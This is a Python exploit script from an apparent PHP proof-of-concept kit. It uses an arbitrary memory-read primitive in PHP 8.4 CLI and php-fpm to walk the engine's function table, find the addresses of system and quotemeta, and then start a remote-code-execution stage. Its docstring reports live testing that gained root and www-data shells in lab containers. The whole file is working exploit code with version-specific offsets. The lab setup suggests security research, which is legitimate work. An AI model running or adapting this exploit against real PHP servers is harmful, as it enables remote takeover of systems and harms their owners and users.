#!/usr/bin/env python3
# INDEX: table-free rce-target resolve via function_table walk | cli fpm | needs binbase + eg_off
"""Table-free RCE-target resolution over an arbitrary-read backend.

Capability: given the arbitrary-read primitive and one
anchor (binbase + EG_off), resolve RCE targets -- quotemeta's zend_function
(the handler-overwrite victim) and system's handler (&zif_system) -- by an
RW-only name-walk of EG(function_table), with no per-build anchor_slots /
anchor_deltas / zif_* offset table.

The read backend reads RW memory only and cannot read RO pages (r2g's
bin2hex(substr(...,0,16384)) takes php_substr's whole-string fast path ->
GC_ADDREF writes str+0x00 = T-0x18 on a RO page -> SIGSEGV), so a gnu_hash
walk of RO .dynsym cannot ride it. EG(function_table) is an RW-heap HashTable
and zend_register_functions copies each zend_internal_function (incl. the
handler FIELD) into RW storage, so the by-name walk resolves the targets with
no RO read. Remaining per-build input: binbase + EG_off; the rest are stable
zend ABI offsets.

Tested: live 8.4.26 cli-vuln (14 RW reads, worker alive, then RCE -> uid=0)
and php-fpm (-> uid=www-data).
"""

import argparse
import json
import os
import re
import subprocess
import sys

_HERE = os.path.dirname(os.path.abspath(__file__))
_POC_ROOT = os.path.dirname(os.path.dirname(_HERE))  # poc/
for _p in (_HERE, _POC_ROOT):
    if _p not in sys.path:
        sys.path.insert(0, _p)

from common.offsets import load_offsets
import var_hash_rw as A
import symbol_resolver as _symbol_resolver
from common.proc_gdb import Maps, zendmm_chunk_bases

# Stable zend ABI offsets (8.4.x).
EG_OFF = {"cli": 0x16E2020, "fpm": 0x16E22C0}   # executor_globals, binbase-rel
HT_POST_OFF = {"cli": 0x58038, "fpm": 0x59038}  # $_POST HashTable, chunk-rel
# EG.function_table shifts per minor version (0x1b0 on 8.3/8.4, 0x1c8 on 8.5.x
# as zend_executor_globals grew), and zend_internal_function.handler shifts too
# (0x48 on 8.3, 0x58 on 8.4/8.5). Both are DERIVED at runtime from RW reads
# (find_function_table / handler_of) so the walk auto-ports across 8.3/8.4/8.5
# with no fixed FT_OFF/HANDLER_OFF constant.
FT_OFF_CANDIDATES = (0x1B0, 0x1C8)
HT_MASK = 0x0C            # HashTable.nTableMask
HT_ARDATA = 0x10
HT_NUSED = 0x18
BUCKET = 0x20             # sizeof(Bucket)
B_VAL = 0x00              # Bucket.val.value (zend_function* for a function entry)
B_NEXT = 0x0C            # Bucket.val.u2.next (Z_NEXT, collision chain index)
B_H = 0x10                # Bucket.h


def zhash(s):
    """PHP's unseeded DJBX33A with bit63 set (zend_string hash)."""
    return _symbol_resolver.php_djb_hash(s, set_top_bit=True)


class FunctionTableWalker:
    """RW-only resolver on an arbitrary-read backend. All reads go through the
    survive=True arbitrary read; none touch RO pages."""

    def __init__(self, rdr, binbase, eg_off, verbose=False):
        self.rdr = rdr
        self.binbase = binbase
        self.eg = binbase + eg_off
        self.verbose = verbose

    # --- raw reads via the sidtail= line (ignore the sid= length line, which
    # fails to parse when *(T-8) has bit63 set -> negative zend_long strlen) ---
    def _sidtail(self, fake_str_addr, tries=8):
        for _ in range(tries):
            text = self.rdr._fire(fake_str_addr)
            if text:
                m = re.search(r"sidtail=([0-9a-f]*)", text)
                if m and m.group(1):
                    return bytes.fromhex(m.group(1))
        return None

    def rd(self, addr, n=8, tries=8):
        """Read n bytes at addr. Needs *(addr-8) (the forged len) to exceed the
        bytes we want; recoverable (never crashes on RW, unlike RO)."""
        for _ in range(tries):
            d = self._sidtail(addr - 0x18)
            if d is not None and len(d) >= n:
                return d[:n]
        return None

    def rd_window(self, anchor, off, n=8, tries=8):
        """Read n bytes at anchor+off by anchoring the forged string at `anchor`
        (so the len is *(anchor-8), chosen large) and slicing the window. Used
        for fields like handler@fn+0x58 whose own preceding qword is small.
        Retries until a window of at least off+n bytes comes back (short/flaky
        reads are recoverable on RW)."""
        for _ in range(tries):
            d = self._sidtail(anchor - 0x18, tries=1)
            if d is not None and len(d) >= off + n:
                return int.from_bytes(d[off:off + n], "little")
        return None

    def rd8(self, addr):
        d = self.rd(addr, 8)
        return int.from_bytes(d, "little") if d else None

    def rd4(self, addr):
        d = self.rd(addr, 4)
        return int.from_bytes(d, "little") if d else None

    def handler_of(self, fn):
        """zend_internal_function.handler, with NO fixed offset (0x48 on 8.3,
        0x58 on 8.4/8.5). One reflected window anchored at fn+0x10 (len =
        *(fn+0x08) = function_name ptr, large -> RW-safe 16 KiB); the first qword
        in fn+0x40..0x68 landing in the binary text window [binbase, binbase+32
        MiB) is the handler (module_entry is the next text ptr, so first match
        wins). low32 != 0 rejects the binbase-high<<32 marker word that precedes
        it. Retried: short/flaky reads are recoverable on RW."""
        lo, hi = self.binbase, self.binbase + 0x2000000
        for _ in range(8):
            d = self._sidtail(fn + 0x10 - 0x18, tries=1)   # d[i] = *(fn+0x10+i)
            if not d or len(d) < 0x60:
                continue
            for abs_off in range(0x40, 0x70, 8):
                i = abs_off - 0x10
                v = int.from_bytes(d[i:i + 8], "little")
                if v and (v & 0xFFFFFFFF) and lo <= v < hi:
                    return v
        return None

    def find_function_table(self):
        """Derive EG.function_table with NO fixed offset. Probe each candidate EG
        slot; accept the first pointing to a HashTable with a function-table
        header (mask 0xfffffxxx, 200<=nNumUsed<=60000). Covers 0x1b0 (<=8.4) ->
        0x1c8 (>=8.5). RW-only reads; the range+alignment guard rejects scalars
        and stack pointers."""
        for off in FT_OFF_CANDIDATES:
            p = self.rd8(self.eg + off)
            if not (p and 0x100000000000 <= p < 0x7F0000000000 and (p & 7) == 0):
                continue
            mask = self.rd4(p + HT_MASK)
            nnu = self.rd4(p + HT_NUSED)
            if (mask is not None and 0xFFFFF000 <= mask <= 0xFFFFFFFF
                    and nnu is not None and 200 <= nnu <= 60000):
                return p, off
        return None, None

    def function_table(self):
        ft, _ = self.find_function_table()
        return ft

    def walk(self, name, ft=None):
        """Resolve a function NAME to its zend_function* via the RW hash walk."""
        if ft is None:
            ft = self.function_table()
        if not ft:
            return None, ft
        mask = self.rd4(ft + HT_MASK)
        ar = self.rd8(ft + HT_ARDATA)
        if mask is None or not ar:
            return None, ft
        h = zhash(name)
        nindex = (h | mask) & 0xFFFFFFFF
        si = nindex - 0x100000000 if (nindex & 0x80000000) else nindex
        idx = self.rd4(ar + si * 4)           # HT_HASH slot -> bucket INDEX
        for _ in range(64):
            if idx is None or idx == 0xFFFFFFFF:
                return None, ft
            bucket = ar + idx * BUCKET
            bh = self.rd8(bucket + B_H)
            if bh == h:
                return self.rd8(bucket + B_VAL), ft   # zend_function*
            idx = self.rd4(bucket + B_NEXT)           # Z_NEXT

    def resolve(self, names=("system", "quotemeta")):
        """Return {name: {'fn': zend_function*, 'handler': &zif_*}} for each."""
        ft = self.function_table()
        if self.verbose:
            print(f"[resolve] EG={self.eg:#x} function_table={ft:#x} "
                  f"nNumUsed={self.rd4(ft + HT_NUSED)} "
                  f"[{self.rdr.req_count} reads]")
        out = {}
        for nm in names:
            fn, ft = self.walk(nm, ft)
            handler = self.handler_of(fn) if fn else None
            out[nm] = {"fn": fn, "handler": handler}
            if self.verbose:
                print(f"[resolve] {nm}: fn={fn and hex(fn)} "
                      f"handler={handler and hex(handler)} "
                      f"[{self.rdr.req_count} reads]")
        return out


# /proc/1/maps bootstrap (lab): binbase (php / php-fpm) + request-heap chunk.
def bootstrap(service, url="http://127.0.0.1"):
    # Warm up through the given url so the request-heap chunk exists. For fpm
    # the service container has no HTTP of its own, so url is the nginx front
    # (e.g. http://web-vuln), reachable from inside the fpm container.
    subprocess.run(["docker", "compose", "exec", "-T", service,
                    "curl", "-s", "-o", "/dev/null", url + "/index.php"],
                   capture_output=True)
    maps = subprocess.run(["docker", "compose", "exec", "-T", service,
                           "cat", "/proc/1/maps"], capture_output=True,
                          text=True).stdout
    m = Maps(maps)
    binbase = m.binbase()
    bases = zendmm_chunk_bases(m.rows, require_off0=True, align="end")
    chunk = bases[0] if bases else None
    return binbase, chunk


def main(argv=None):
    ap = argparse.ArgumentParser(description="table-free function_table resolve (+optional RCE)")
    ap.add_argument("url", help="target (in-container base, e.g. http://127.0.0.1)")
    ap.add_argument("--service", required=True, help="docker compose service (cli-vuln / fpm-vuln)")
    ap.add_argument("--sapi", choices=["cli", "fpm"], default="cli")
    ap.add_argument("--rce", action="store_true",
                    help="after resolving, fire var-hash-rw --mode rce with the RW-derived fn/zsys")
    ap.add_argument("--verbose", action="store_true")
    a = ap.parse_args(argv)

    binbase, chunk = bootstrap(a.service, a.url)
    if not binbase or not chunk:
        print(f"[resolve] bootstrap failed (binbase={binbase}, chunk={chunk})")
        return 1
    print(f"[resolve] binbase={binbase:#x} chunk={chunk:#x}")

    sapi = "fpm-fcgi" if a.sapi == "fpm" else None
    off = load_offsets("8.4.26", sapi)
    aoff = chunk + off["a_off"]
    seed = {"chunk": chunk, "binbase": binbase, "a": aoff,
            "copy": aoff + off["copy_off"], "sid": aoff + off["sid_off"],
            "ht_post": chunk + HT_POST_OFF[a.sapi],
            "bg_unserialize_off": off["bg_unserialize_off"]}
    rdr = A.ArbRead(a.url, seed, service=a.service, want_sidpath=True,
                      survive=True, verbose=False)

    w = FunctionTableWalker(rdr, binbase, EG_OFF[a.sapi], verbose=a.verbose)
    res = w.resolve(("system", "quotemeta"))
    zsys = res["system"]["handler"]
    fn = res["quotemeta"]["fn"]
    gt_zsys = binbase + off["zif_system"]
    gt_qm = binbase + off["zif_quotemeta"]
    print(f"[resolve] zif_system = {zsys and hex(zsys)}  GT={gt_zsys:#x}  "
          f"{'OK' if zsys == gt_zsys else 'MISMATCH'}")
    print(f"[resolve] quotemeta handler = {res['quotemeta']['handler'] and hex(res['quotemeta']['handler'])}"
          f"  GT={gt_qm:#x}  {'OK' if res['quotemeta']['handler'] == gt_qm else 'MISMATCH'}")
    print(f"[resolve] fn (quotemeta zend_function) = {fn and hex(fn)}")
    print(f"[resolve] total reads = {rdr.req_count}")

    if not a.rce:
        return 0 if (zsys == gt_zsys and fn) else 1
    if not (zsys and fn):
        print("[resolve] cannot fire RCE: resolution incomplete")
        return 1
    # Fire the RCE with the RW-derived (table-free) fn/zsys.
    cmd = [sys.executable, os.path.join(_POC_ROOT, "php2shell.py"),
           "var-hash-rw", a.url, "--service", a.service, "--mode", "rce",
           "--a", hex(aoff), "--copy", hex(aoff + off["copy_off"]),
           "--binbase", hex(binbase), "--fn", hex(fn), "--zsys", hex(zsys)]
    print("[resolve] firing RCE:", " ".join(cmd))
    r = subprocess.run(cmd, capture_output=True, text=True)
    print(r.stdout[-800:])
    if "uid=" in r.stdout:
        print("[resolve] RCE OK (table-free, RW-walk-derived addresses)")
        return 0
    print("[resolve] RCE did not report uid= (see output above)")
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
